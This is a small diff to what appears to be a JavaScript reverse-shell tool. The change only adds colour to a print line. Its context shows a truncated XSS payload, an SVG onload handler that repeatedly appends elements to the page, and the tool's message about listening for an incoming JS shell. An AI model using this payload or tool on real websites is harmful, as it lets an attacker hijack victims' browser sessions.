@@ -49,7 +49,7 @@ payload = '<svg/onload=setInterval(function(){with(document)body.appendChild(cre
 
 print(banner)
 if gene == True:
-    print('Payload:')
+    print('%sPayload:' % white)
     print(payload)
     
 print('%sListening on [any] %s for incoming JS shell ...' % (white, port))
